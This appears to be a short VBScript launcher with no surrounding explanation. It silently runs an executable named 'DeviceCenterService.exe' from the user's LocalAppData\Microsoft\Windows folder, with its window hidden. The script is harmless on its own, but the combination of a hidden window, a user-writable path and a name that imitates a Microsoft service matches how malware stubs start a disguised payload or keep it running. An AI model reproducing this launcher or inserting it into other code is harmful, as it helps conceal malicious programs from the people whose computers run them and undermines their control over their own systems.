Set WshShell = CreateObject("WScript.Shell")
targetPath = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\DeviceCenterService.exe")
WshShell.Run """" & targetPath & """", 0, False